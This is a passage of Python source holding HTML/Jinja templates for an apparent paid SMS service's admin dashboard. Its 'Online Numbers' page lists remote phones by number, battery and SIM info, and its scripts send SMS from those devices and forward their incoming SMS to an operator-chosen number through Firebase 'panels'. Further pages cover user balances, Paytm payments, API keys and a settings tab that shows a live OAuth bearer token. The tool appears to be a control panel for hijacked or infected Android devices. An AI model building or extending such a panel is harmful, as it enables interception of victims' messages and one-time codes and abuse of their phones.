  <h1 style="margin:0"><i class="fas fa-signal accent"></i> <span class="accent">Online</span> <span class="gold">Numbers</span></h1>

  <div style="display:flex;gap:12px;align-items:center">

    <span id="liveIndicator" style="font-size:12px;color:#22c55e;font-weight:600"><i class="fas fa-circle" style="animation:pulse 1.5s infinite"></i> Live</span>

    <span id="lastUpdate" style="font-size:11px;color:#94a3b8">Loading...</span>

    <span id="onlineCount" style="font-size:13px;color:#64748b;font-weight:600">{{ total }} online</span>

  </div>

</div>

<style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}} .fade-in{animation:fadeIn .3s ease} @keyframes fadeIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}</style>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-mobile-alt"></i> All Online Devices (<span id="devCount">0</span>)</h2>

    <div style="display:flex;gap:10px;align-items:center">

      <div class="search-box" style="margin:0;width:260px">

        <i class="fas fa-search"></i>

        <input type="text" id="devSearch" class="input" placeholder="Search number, panel..." oninput="filterTable('devSearch','devTable')">

      </div>

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="devTable">

      <thead><tr><th>Number</th><th>Device ID</th><th>Panel</th><th>Battery</th><th>SIM Info</th><th>Actions</th></tr></thead>

      <tbody id="devBody">

        <tr><td colspan="6" style="text-align:center;color:#94a3b8;padding:28px"><i class="fas fa-spinner fa-spin"></i> Loading...</td></tr>

      </tbody>

    </table>

  </div>

</div>



<div id="sendModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center">

  <div class="card" style="width:420px;max-width:90vw">

    <div class="card-header"><h2><i class="fas fa-paper-plane"></i> Send SMS</h2></div>

    <div class="card-body">

      <p style="font-size:12px;color:#64748b;margin-bottom:14px">From: <strong id="modalDevice"></strong></p>

      <div class="form-group" style="margin-bottom:14px">

        <label>Target Number</label>

        <input type="text" id="modalTarget" class="input" placeholder="919876543210">

      </div>

      <div class="form-group" style="margin-bottom:14px">

        <label>Message</label>

        <textarea id="modalMessage" class="input" rows="3" placeholder="Type message..."></textarea>

      </div>

      <input type="hidden" id="modalPanelUrl">

      <input type="hidden" id="modalClientId">

      <div style="display:flex;gap:10px">

        <button class="btn btn-accent" style="flex:1" onclick="doSendFromDevice()"><i class="fas fa-paper-plane"></i> Send</button>

        <button class="btn btn-outline" onclick="closeModal('sendModal')">Cancel</button>

      </div>

      <span id="sendResult" style="display:block;margin-top:10px;font-size:13px"></span>

    </div>

  </div>

</div>



<div id="forwardModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.5);z-index:1000;align-items:center;justify-content:center">

  <div class="card" style="width:420px;max-width:90vw">

    <div class="card-header"><h2><i class="fas fa-share"></i> SMS Forwarding</h2></div>

    <div class="card-body">

      <p style="font-size:12px;color:#64748b;margin-bottom:14px">Device: <strong id="fwdDevice"></strong></p>

      <div class="form-group" style="margin-bottom:14px">

        <label>Forward incoming SMS to this number</label>

        <input type="text" id="fwdTarget" class="input" placeholder="919876543210">

      </div>

      <input type="hidden" id="fwdPanelUrl">

      <input type="hidden" id="fwdClientId">

      <div style="display:flex;gap:10px">

        <button class="btn btn-gold" style="flex:1" onclick="doSetupForward()"><i class="fas fa-check"></i> Enable</button>

        <button class="btn btn-danger btn-sm" onclick="doDisableForward()"><i class="fas fa-times"></i> Disable</button>

        <button class="btn btn-outline" onclick="closeModal('forwardModal')">Cancel</button>

      </div>

      <span id="fwdResult" style="display:block;margin-top:10px;font-size:13px"></span>

    </div>

  </div>

</div>



<script>

var _prevIds = '';

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

function closeModal(id){document.getElementById(id).style.display='none';}

function openModal(id){document.getElementById(id).style.display='flex';}

function sendFromDevice(cid,panel,number){

  document.getElementById('modalDevice').textContent=number||cid;

  document.getElementById('modalClientId').value=cid;

  document.getElementById('modalPanelUrl').value=panel;

  document.getElementById('modalTarget').value='';

  document.getElementById('modalMessage').value='';

  document.getElementById('sendResult').textContent='';

  openModal('sendModal');

}

function setupForward(cid,panel,number){

  document.getElementById('fwdDevice').textContent=number||cid;

  document.getElementById('fwdClientId').value=cid;

  document.getElementById('fwdPanelUrl').value=panel;

  document.getElementById('fwdTarget').value='';

  document.getElementById('fwdResult').textContent='';

  openModal('forwardModal');

}



function renderDevices(devices){

  var html='';

  if(!devices||devices.length===0){

    html='<tr><td colspan="6" style="text-align:center;color:#94a3b8;padding:28px">No devices online yet. Probing in background...</td></tr>';

  }else{

    for(var i=0;i<devices.length;i++){

      var d=devices[i];

      var bat=parseInt(d.battery)||0;

      var batColor=bat>50?'#22c55e':bat>20?'#eab308':'#ef4444';

      html+='<tr class="fade-in">';

      html+='<td><strong>'+(d.number||'Unknown')+'</strong></td>';

      html+='<td style="font-size:12px;color:#64748b">'+d.id.substring(0,16)+'</td>';

      html+='<td style="font-size:12px">'+d.panel.substring(0,30)+'</td>';

      html+='<td><span style="color:'+batColor+'">'+d.battery+'</span></td>';

      html+='<td style="font-size:12px">'+d.sim_info.substring(0,50)+'</td>';

      html+='<td><div style="display:flex;gap:6px">';

      html+='<a href="/firebase-sms-history/'+d.panel+'" class="btn btn-outline btn-sm" title="SMS History"><i class="fas fa-history"></i></a> ';

      html+='<button class="btn btn-accent btn-sm" title="Send SMS" onclick="sendFromDevice(\''+d.id+'\',\''+d.panel+'\',\''+d.number+'\')"><i class="fas fa-paper-plane"></i></button> ';

      html+='<button class="btn btn-gold btn-sm" title="Forward SMS" onclick="setupForward(\''+d.id+'\',\''+d.panel+'\',\''+d.number+'\')"><i class="fas fa-share"></i></button>';

      html+='</div></td></tr>';

    }

  }

  document.getElementById('devBody').innerHTML=html;

}



async function refreshOnline(){

  try{

    var r=await fetch('/api/live-online');

    var d=await r.json();

    document.getElementById('devCount').textContent=d.devices.length;

    document.getElementById('onlineCount').textContent=d.total+' online';

    if(d.last_update){

      var lu=new Date(d.last_update);

      document.getElementById('lastUpdate').textContent='Updated '+lu.toLocaleTimeString();

    }

    var newIds=d.devices.map(function(x){return x.id}).join(',');

    if(newIds!==_prevIds){renderDevices(d.devices);_prevIds=newIds;}

    document.getElementById('liveIndicator').innerHTML='<i class="fas fa-circle" style="animation:pulse 1.5s infinite"></i> Live';

  }catch(e){

    document.getElementById('liveIndicator').innerHTML='<i class="fas fa-exclamation-circle" style="color:#eab308"></i> Reconnecting...';

  }

}



async function doSendFromDevice(){

  var st=document.getElementById('sendResult');

  st.innerHTML='<i class="fas fa-spinner fa-spin"></i> Sending...';st.style.color='#0ea5e9';

  try{

    var r=await fetch('/firebase-send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({panel:document.getElementById('modalPanelUrl').value,client:document.getElementById('modalClientId').value,target:document.getElementById('modalTarget').value,message:document.getElementById('modalMessage').value})});

    var d=await r.json();

    if(d.ok){st.innerHTML='<i class="fas fa-check-circle"></i> '+escapeHtml(d.detail);st.style.color='#22c55e';}

    else{st.innerHTML='<i class="fas fa-times-circle"></i> '+escapeHtml(d.error);st.style.color='#ef4444';}

  }catch(e){st.innerHTML='Failed';st.style.color='#ef4444';}

}

async function doSetupForward(){

  var st=document.getElementById('fwdResult');

  st.innerHTML='<i class="fas fa-spinner fa-spin"></i> Setting up...';st.style.color='#0ea5e9';

  try{

    var r=await fetch('/firebase-setup-forward',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({panel:document.getElementById('fwdPanelUrl').value,client:document.getElementById('fwdClientId').value,target:document.getElementById('fwdTarget').value})});

    var d=await r.json();

    if(d.ok){st.innerHTML='<i class="fas fa-check-circle"></i> Forwarding enabled!';st.style.color='#22c55e';}

    else{st.innerHTML='<i class="fas fa-times-circle"></i> '+escapeHtml(d.error);st.style.color='#ef4444';}

  }catch(e){st.innerHTML='Failed';st.style.color='#ef4444';}

}

async function doDisableForward(){

  var st=document.getElementById('fwdResult');

  st.innerHTML='<i class="fas fa-spinner fa-spin"></i> Disabling...';st.style.color='#eab308';

  try{

    var r=await fetch('/firebase-disable-forward',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({panel:document.getElementById('fwdPanelUrl').value,client:document.getElementById('fwdClientId').value})});

    var d=await r.json();

    if(d.ok){st.innerHTML='<i class="fas fa-check-circle"></i> Disabled';st.style.color='#22c55e';}

    else{st.innerHTML='<i class="fas fa-times-circle"></i> '+escapeHtml(d.error);st.style.color='#ef4444';}

  }catch(e){st.innerHTML='Failed';st.style.color='#ef4444';}

}



refreshOnline();

setInterval(refreshOnline,5000);

</script>

"""



FIREBASE_SMS_HISTORY = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-history accent"></i> <span class="accent">SMS</span> <span class="gold">History</span></h1>

  <a href="/online-numbers" class="btn btn-outline btn-sm"><i class="fas fa-arrow-left"></i> Back</a>

</div>

<p style="font-size:13px;color:#64748b;margin-bottom:18px">Panel: <strong>{{ panel_name }}</strong> | {{ panel_url[:50] }}...</p>



<div class="card">

  <div class="card-header"><h2><i class="fas fa-comment-dots"></i> Firebase SMS Records ({{ sms_data|length }})</h2></div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table>

      <thead><tr><th>Device</th><th>Type</th><th>To</th><th>Message</th><th>Status</th><th>Timestamp</th></tr></thead>

      <tbody>

        {% for s in sms_data %}

        <tr>

          <td style="font-size:12px">{{ s.device }}</td>

          <td><span class="badge badge-blue">{{ s.type }}</span></td>

          <td>{{ s.to or '-' }}</td>

          <td class="truncate" style="max-width:200px">{{ s.message or '-' }}</td>

          <td><span class="badge badge-{{ 'green' if s.status=='sent' or s.status==true else 'yellow' if s.status=='pending' else 'red' }}">{{ s.status }}</span></td>

          <td style="font-size:12px">{{ s.timestamp[:16] if s.timestamp else '-' }}</td>

        </tr>

        {% endfor %}

        {% if not sms_data %}

        <tr><td colspan="6" style="text-align:center;color:#94a3b8;padding:28px">No SMS records found</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>

"""



USERS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-users accent"></i> <span class="accent">User</span> <span class="gold">Management</span></h1>

  <span style="font-size:13px;color:#64748b;font-weight:500">{{ total_users }} users total</span>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-users"></i> All Users</h2>

    <form method="GET" action="/users" style="display:flex;gap:8px;align-items:center">

      <div class="search-box" style="margin:0;width:260px">

        <i class="fas fa-search"></i>

        <input type="text" name="q" class="input" value="{{ search }}" placeholder="Search by ID, name, username...">

      </div>

      <button type="submit" class="btn btn-accent btn-sm"><i class="fas fa-search"></i></button>

    </form>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table>

      <thead><tr><th>User ID</th><th>Name</th><th>Username</th><th>Balance</th><th>SMS</th><th>Joined</th><th>Status</th><th>Actions</th></tr></thead>

      <tbody>

        {% for u in users %}

        <tr>

          <td><strong>{{ u.user_id }}</strong></td>

          <td>{{ u.name or '-' }}</td>

          <td>{{ ('@' + u.username) if u.username else '-' }}</td>

          <td style="font-weight:600;color:#d4a853">₹{{ '%.2f'|format(u.balance|default(0)|float) }}</td>

          <td>{{ u.sms_sent }}</td>

          <td>{{ u.joined[:10] if u.joined else '-' }}</td>

          <td>{% if u.banned %}<span class="badge badge-red">Banned</span>{% else %}<span class="badge badge-green">Active</span>{% endif %}</td>

          <td style="white-space:nowrap">

            <button class="btn btn-sm btn-outline" onclick="openEditModal('{{ u.user_id }}','{{ u.name or '' }}','{{ u.username or '' }}')"><i class="fas fa-edit"></i></button>

            <button class="btn btn-sm btn-accent" onclick="openModal('add','{{ u.user_id }}')"><i class="fas fa-plus"></i></button>

            <button class="btn btn-sm btn-gold" onclick="openModal('deduct','{{ u.user_id }}')"><i class="fas fa-minus"></i></button>

            {% if u.banned %}

            <form method="POST" action="/users/unban/{{ u.user_id }}" style="display:inline"><button type="submit" class="btn btn-sm btn-accent" title="Unban"><i class="fas fa-check"></i></button></form>

            {% else %}

            <button class="btn btn-sm btn-danger" onclick="openBanModal('{{ u.user_id }}')"><i class="fas fa-ban"></i></button>

            {% endif %}

            <form method="POST" action="/users/delete/{{ u.user_id }}" style="display:inline" onsubmit="return confirm('Delete this user permanently?')"><button type="submit" class="btn btn-sm btn-danger" title="Delete"><i class="fas fa-trash"></i></button></form>

          </td>

        </tr>

        {% endfor %}

        {% if not users %}

        <tr><td colspan="8" style="text-align:center;color:#94a3b8;padding:28px">No users found</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<div class="pagination">

  {% if page > 1 %}<a href="/users?page={{ page-1 }}{% if search %}&q={{ search }}{% endif %}"><i class="fas fa-chevron-left"></i></a>{% else %}<span class="disabled"><i class="fas fa-chevron-left"></i></span>{% endif %}

  {% for p in range(1, total_pages+1) %}

    {% if p == page %}<span class="current">{{ p }}</span>{% elif p <= 3 or p > total_pages-3 or (p >= page-2 and p <= page+2) %}<a href="/users?page={{ p }}{% if search %}&q={{ search }}{% endif %}">{{ p }}</a>{% elif p == 4 or p == total_pages-3 %}<span class="disabled">...</span>{% endif %}

  {% endfor %}

  {% if page < total_pages %}<a href="/users?page={{ page+1 }}{% if search %}&q={{ search }}{% endif %}"><i class="fas fa-chevron-right"></i></a>{% else %}<span class="disabled"><i class="fas fa-chevron-right"></i></span>{% endif %}

</div>



<div class="modal-overlay" id="balanceModal">

  <div class="modal">

    <h3 id="modalTitle">Adjust Balance</h3>

    <form id="balanceForm" method="POST">

      <input type="hidden" name="user_id" id="modalUserId">

      <input type="hidden" name="action" id="modalAction">

      <div class="form-group"><label>Amount (₹)</label><input type="number" name="amount" class="input" step="0.01" min="0.01" required></div>

      <div class="modal-actions">

        <button type="button" class="btn btn-outline" onclick="closeModal()">Cancel</button>

        <button type="submit" class="btn btn-accent">Confirm</button>

      </div>

    </form>

  </div>

</div>



<div class="modal-overlay" id="editModal">

  <div class="modal">

    <h3>Edit User</h3>

    <form id="editForm" method="POST" action="/users/edit">

      <input type="hidden" name="user_id" id="editUserId">

      <div class="form-group"><label>Name</label><input type="text" name="name" id="editName" class="input" placeholder="User name"></div>

      <div class="form-group"><label>Username</label><input type="text" name="username" id="editUsername" class="input" placeholder="@username"></div>

      <div class="modal-actions">

        <button type="button" class="btn btn-outline" onclick="closeEditModal()">Cancel</button>

        <button type="submit" class="btn btn-accent">Save</button>

      </div>

    </form>

  </div>

</div>



<div class="modal-overlay" id="banModal">

  <div class="modal">

    <h3>Ban User</h3>

    <form id="banForm" method="POST">

      <input type="hidden" name="user_id" id="banUserId">

      <div class="form-group"><label>Ban Reason</label><input type="text" name="reason" class="input" placeholder="Reason for ban"></div>

      <div class="modal-actions">

        <button type="button" class="btn btn-outline" onclick="closeBanModal()">Cancel</button>

        <button type="submit" class="btn btn-danger">Ban User</button>

      </div>

    </form>

  </div>

</div>



<script>

function openModal(action,uid){document.getElementById('modalUserId').value=uid;document.getElementById('modalAction').value=action;document.getElementById('modalTitle').textContent=(action==='add'?'Add':'Deduct')+' Balance - '+uid;document.getElementById('balanceForm').action=action==='add'?'/users/add-balance':'/users/deduct-balance';document.getElementById('balanceModal').classList.add('active')}

function closeModal(){document.getElementById('balanceModal').classList.remove('active')}

function openEditModal(uid,name,username){document.getElementById('editUserId').value=uid;document.getElementById('editName').value=name;document.getElementById('editUsername').value=username;document.getElementById('editModal').classList.add('active')}

function closeEditModal(){document.getElementById('editModal').classList.remove('active')}

function openBanModal(uid){document.getElementById('banUserId').value=uid;document.getElementById('banForm').action='/users/ban/'+uid;document.getElementById('banModal').classList.add('active')}

function closeBanModal(){document.getElementById('banModal').classList.remove('active')}

</script>

"""



PAYMENTS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-rupee-sign accent"></i> <span class="accent">Payment</span> <span class="gold">History</span></h1>

  <div style="display:flex;align-items:center;gap:12px">

    <span style="font-size:15px;font-weight:700;color:#d4a853">Total: ₹{{ '%.2f'|format(total) }}</span>

    <span style="font-size:13px;color:#64748b;font-weight:500">{{ payments|length }} payments</span>

  </div>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-credit-card"></i> All Payments</h2>

    <div class="search-box" style="margin:0;width:260px">

      <i class="fas fa-search"></i>

      <input type="text" id="paymentSearch" class="input" placeholder="Search by UTR, name, VPA..." oninput="filterTable('paymentSearch','paymentTable')">

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="paymentTable">

      <thead><tr><th>UTR</th><th>Merchant ID</th><th>Amount</th><th>Currency</th><th>Payer Name</th><th>VPA</th><th>PSP</th><th>Pay Time</th></tr></thead>

      <tbody>

        {% for p in payments %}

        <tr>

          <td><strong>{{ p.biz_order_id }}</strong></td>

          <td class="truncate">{{ p.merchant_trans_id or '-' }}</td>

          <td style="font-weight:600;color:#d4a853">₹{{ '%.2f'|format(p.amount|default(0)|float) }}</td>

          <td>{{ p.currency or 'INR' }}</td>

          <td>{{ p.payer_name or '-' }}</td>

          <td>{{ p.payer_vpa or '-' }}</td>

          <td>{{ p.payer_psp or '-' }}</td>

          <td>{{ p.pay_time[:16] if p.pay_time else '-' }}</td>

        </tr>

        {% endfor %}

        {% if not payments %}

        <tr><td colspan="8" style="text-align:center;color:#94a3b8;padding:28px">No payments found</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<script>

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

</script>

"""



VERIFY_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-check-circle accent"></i> <span class="accent">Verify</span> <span class="gold">UTR</span></h1>

</div>



<div class="card" style="max-width:560px">

  <div class="card-header"><h2><i class="fas fa-search"></i> UTR Verification</h2></div>

  <div class="card-body">

    <form method="POST" action="/verify" class="form-row">

      <div class="form-group" style="flex:1">

        <label>UTR Number</label>

        <input type="text" name="utr" class="input" placeholder="Enter UTR to verify" required>

      </div>

      <div style="display:flex;align-items:flex-end">

        <button type="submit" class="btn btn-accent"><i class="fas fa-search"></i> Verify</button>

      </div>

    </form>

    {% if result %}

    <div style="margin-top:24px">

      {% if found %}

      <div class="card" style="box-shadow:0 2px 12px rgba(34,197,94,0.1);border-color:rgba(34,197,94,0.3)">

        <div class="card-body">

          <h3 style="color:#16a34a;margin-bottom:16px"><i class="fas fa-check-circle"></i> Payment Found</h3>

          <table>

            <tr><td style="font-weight:600;color:#64748b">UTR</td><td>{{ result.biz_order_id }}</td></tr>

            <tr><td style="font-weight:600;color:#64748b">Amount</td><td style="font-weight:700;color:#d4a853">₹{{ '%.2f'|format(result.amount|float) }}</td></tr>

            <tr><td style="font-weight:600;color:#64748b">Payer</td><td>{{ result.payer_name or '-' }}</td></tr>

            <tr><td style="font-weight:600;color:#64748b">VPA</td><td>{{ result.payer_vpa or '-' }}</td></tr>

            <tr><td style="font-weight:600;color:#64748b">Time</td><td>{{ result.pay_time or '-' }}</td></tr>

          </table>

        </div>

      </div>

      {% else %}

      <div class="flash flash-error"><i class="fas fa-exclamation-circle"></i> No payment found with UTR: <strong>{{ utr }}</strong></div>

      {% endif %}

    </div>

    {% endif %}

  </div>

</div>

"""



SMS_LOGS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-comment-dots accent"></i> <span class="accent">SMS</span> <span class="gold">Logs</span></h1>

  <span style="font-size:13px;color:#64748b;font-weight:500">{{ total_logs }} total logs</span>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-sms"></i> All Logs</h2>

    <div class="search-box" style="margin:0;width:260px">

      <i class="fas fa-search"></i>

      <input type="text" id="logSearch" class="input" placeholder="Search logs..." oninput="filterTable('logSearch','logTable')">

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="logTable">

      <thead><tr><th>ID</th><th>User</th><th>Target</th><th>Panel</th><th>Status</th><th>Message</th><th>Time</th></tr></thead>

      <tbody>

        {% for log in logs %}

        <tr>

          <td>{{ log.id }}</td>

          <td>{{ log.user_id }}</td>

          <td>{{ log.target }}</td>

          <td class="truncate" title="{{ log.panel }}">{{ log.panel[:30] if log.panel else '-' }}</td>

          <td><span class="badge badge-{{ 'green' if log.status == 'sent' else 'red' }}">{{ log.status }}</span></td>

          <td class="truncate" title="{{ log.message }}">{{ log.message[:40] if log.message else '-' }}</td>

          <td>{{ log.created_at[:16] if log.created_at else '-' }}</td>

        </tr>

        {% endfor %}

        {% if not logs %}

        <tr><td colspan="7" style="text-align:center;color:#94a3b8;padding:28px">No SMS logs yet</td></tr>

        {% endif %}

      </tbody>

    </table>

    {% if total_pages > 1 %}

    <div style="display:flex;gap:6px;justify-content:center;padding:20px;flex-wrap:wrap">

      {% if page > 1 %}

      <a href="/sms-logs?page={{ page - 1 }}" style="padding:8px 14px;border-radius:8px;background:#f0f4f8;color:#1e293b;text-decoration:none;font-size:13px;font-weight:500;transition:all .2s" onmouseover="this.style.background='#0ea5e9';this.style.color='#fff'"><i class="fas fa-chevron-left"></i></a>

      {% endif %}

      {% for p in range(1, total_pages + 1) %}

        {% if p == page %}

          <span style="padding:8px 14px;border-radius:8px;background:linear-gradient(135deg,#0ea5e9,#38bdf8);color:#fff;font-size:13px;font-weight:600">{{ p }}</span>

        {% elif p <= 3 or p > total_pages - 3 or (p >= page - 2 and p <= page + 2) %}

          <a href="/sms-logs?page={{ p }}" style="padding:8px 14px;border-radius:8px;background:#f0f4f8;color:#1e293b;text-decoration:none;font-size:13px;font-weight:500;transition:all .2s" onmouseover="this.style.background='#0ea5e9';this.style.color='#fff'">{{ p }}</a>

        {% elif p == 4 or p == total_pages - 3 %}

          <span style="padding:8px 14px;color:#94a3b8;font-size:13px">...</span>

        {% endif %}

      {% endfor %}

      {% if page < total_pages %}

      <a href="/sms-logs?page={{ page + 1 }}" style="padding:8px 14px;border-radius:8px;background:#f0f4f8;color:#1e293b;text-decoration:none;font-size:13px;font-weight:500;transition:all .2s" onmouseover="this.style.background='#0ea5e9';this.style.color='#fff'"><i class="fas fa-chevron-right"></i></a>

      {% endif %}

    </div>

    {% endif %}

  </div>

</div>



<script>

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

</script>

"""



API_KEYS_PAGE = """

<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:28px">

  <h1 style="margin:0"><i class="fas fa-key accent"></i> <span class="accent">API</span> <span class="gold">Keys</span></h1>

  <span style="font-size:13px;color:#64748b;font-weight:500">{{ keys|length }} keys</span>

</div>



<div class="card" style="margin-bottom:20px">

  <div class="card-header"><h2><i class="fas fa-plus-circle"></i> Create API Key</h2></div>

  <div class="card-body">

    <form method="POST" action="/api-keys/add" class="form-row">

      <div class="form-group" style="flex:1;min-width:180px">

        <label>User ID</label>

        <input type="text" name="user_id" class="input" placeholder="user_id" required>

      </div>

      <div class="form-group" style="flex:1;min-width:180px">

        <label>Key Name</label>

        <input type="text" name="name" class="input" placeholder="My API Key" required>

      </div>

      <div style="display:flex;align-items:flex-end">

        <button type="submit" class="btn btn-gold"><i class="fas fa-plus"></i> Create Key</button>

      </div>

    </form>

  </div>

</div>



<div class="card">

  <div class="card-header">

    <h2><i class="fas fa-key"></i> All API Keys</h2>

    <div class="search-box" style="margin:0;width:260px">

      <i class="fas fa-search"></i>

      <input type="text" id="keySearch" class="input" placeholder="Search keys..." oninput="filterTable('keySearch','keyTable')">

    </div>

  </div>

  <div class="card-body" style="overflow-x:auto;padding:0">

    <table id="keyTable">

      <thead><tr><th>Key</th><th>User</th><th>Name</th><th>Status</th><th>Created</th><th>Actions</th></tr></thead>

      <tbody>

        {% for k in keys %}

        <tr>

          <td><code style="background:#f0f4f8;padding:5px 12px;border-radius:8px;font-size:12px;border:1px solid #e2e8f0">{{ k.key }}</code></td>

          <td>{{ k.user_id }}</td>

          <td>{{ k.name }}</td>

          <td><span class="badge badge-{{ 'green' if k.active else 'red' }}">{{ 'Active' if k.active else 'Disabled' }}</span></td>

          <td>{{ k.created_at[:10] if k.created_at else '-' }}</td>

          <td>

            <form method="POST" action="/api-keys/delete/{{ k.key }}" style="display:inline" onsubmit="return confirm('Delete this key?')">

              <button type="submit" class="btn btn-sm btn-danger"><i class="fas fa-trash"></i></button>

            </form>

          </td>

        </tr>

        {% endfor %}

        {% if not keys %}

        <tr><td colspan="6" style="text-align:center;color:#94a3b8;padding:28px">No API keys</td></tr>

        {% endif %}

      </tbody>

    </table>

  </div>

</div>



<script>

function filterTable(sid,tid){var q=document.getElementById(sid).value.toLowerCase();document.querySelectorAll('#'+tid+' tbody tr').forEach(function(r){r.style.display=r.textContent.toLowerCase().includes(q)?'':'none'})}

</script>

"""



SETTINGS_PAGE = """
<div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:16px">
  <div>
    <h1 style="margin:0;font-size:24px;font-weight:800"><i class="fas fa-cog accent"></i> <span class="accent">System</span> <span class="gold">Settings</span></h1>
    <p style="margin:4px 0 0 0;font-size:13px;color:#64748b">Modular configuration dashboard with independent save controls, live token monitoring, and instant sync.</p>
  </div>
  <div style="display:flex;gap:10px">
    <button type="button" class="btn btn-accent btn-sm" onclick="refreshPaytmSession(this)"><i class="fas fa-sync-alt"></i> Refresh Paytm OAuth Token</button>
  </div>
</div>

<style>
.tab-nav { display:flex; gap:8px; border-bottom:1px solid #1e293b; margin-bottom:24px; flex-wrap:wrap; }
.tab-btn { background:none; border:none; color:#94a3b8; font-weight:600; font-size:14px; padding:12px 18px; cursor:pointer; border-bottom:2px solid transparent; transition:all .2s ease; display:flex; align-items:center; gap:8px; border-radius:6px 6px 0 0; }
.tab-btn:hover { color:#f8fafc; background:rgba(255,255,255,0.02); }
.tab-btn.active { color:#38bdf8; border-bottom-color:#38bdf8; background:rgba(56,189,248,0.06); }
.tab-content { display:none; }
.tab-content.active { display:block; }
.badge-status { padding:4px 12px; border-radius:999px; font-size:11px; font-weight:700; display:inline-flex; align-items:center; gap:6px; }
.badge-active { background:rgba(34,197,94,0.15); color:#22c55e; border:1px solid rgba(34,197,94,0.3); }
.token-container { background:#0f172a; border:1px solid #1e293b; border-radius:10px; padding:14px 16px; font-family:monospace; font-size:13px; word-break:break-all; color:#38bdf8; position:relative; }
.card-action-bar { border-top:1px solid #1e293b; padding:14px 20px; background:rgba(15,23,42,0.5); display:flex; justify-content:space-between; align-items:center; gap:10px; border-radius:0 0 16px 16px; }
</style>

<div class="tab-nav">
  <button type="button" class="tab-btn active" onclick="switchTab('tab-paytm', this)"><i class="fas fa-wallet"></i> 💳 Paytm UPI & Session Token</button>
  <button type="button" class="tab-btn" onclick="switchTab('tab-bot', this)"><i class="fab fa-telegram"></i> 🤖 Telegram Bot Token & Identity</button>
  <button type="button" class="tab-btn" onclick="switchTab('tab-pricing', this)"><i class="fas fa-coins"></i> ⚡ SMS Rates & Limits</button>
  <button type="button" class="tab-btn" onclick="switchTab('tab-bonuses', this)"><i class="fas fa-gift"></i> 🎁 Bonuses & Referrals</button>
  <button type="button" class="tab-btn" onclick="switchTab('tab-alerts', this)"><i class="fas fa-bell"></i> 📢 Notifications & Links</button>
  <button type="button" class="tab-btn" onclick="switchTab('tab-security', this)"><i class="fas fa-lock"></i> 🔐 Admin Security</button>
</div>

<!-- ========================================== -->
<!-- TAB 1: PAYTM UPI & LIVE SESSION TOKEN      -->
<!-- ========================================== -->
<div id="tab-paytm" class="tab-content active">
  <div style="display:flex;flex-direction:column;gap:20px;max-width:880px">
    
    <!-- 1. LIVE SESSION TOKEN MONITOR -->
    <div class="card">
      <div class="card-header" style="display:flex;justify-content:space-between;align-items:center">
        <h2><i class="fas fa-key"></i> Active Paytm OAuth Session Token</h2>
        <span class="badge-status badge-active" id="sessionStatusBadge"><i class="fas fa-check-circle"></i> Live Connected</span>
      </div>
      <div class="card-body">
        <p style="font-size:13px;color:#94a3b8;margin-bottom:16px">The Paytm session access token is automatically refreshed using your OAuth credentials when verifying UPI transactions.</p>
        
        <div style="margin-bottom:16px">
          <label style="font-size:12px;color:#64748b;font-weight:600;text-transform:uppercase;margin-bottom:6px;display:block">Active Access Token (Bearer)</label>
          <div class="token-container">
            <span id="paytmAccessTokenText">{{ paytm_sess.access_token or 'No token loaded' }}</span>
          </div>
        </div>

        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
          <div>
            <label style="font-size:12px;color:#64748b;font-weight:600;text-transform:uppercase;margin-bottom:6px;display:block">Registered Device ID</label>
            <div style="background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:10px 12px;font-family:monospace;font-size:12px;color:#94a3b8">{{ paytm_sess.device_id or 'OnePlus-GM1901' }}</div>
          </div>
          <div>
            <label style="font-size:12px;color:#64748b;font-weight:600;text-transform:uppercase;margin-bottom:6px;display:block">Token Expiry Epoch</label>
            <div style="background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:10px 12px;font-family:monospace;font-size:12px;color:#22c55e">{{ paytm_sess.expires_in or 'Active' }}</div>
          </div>
        </div>

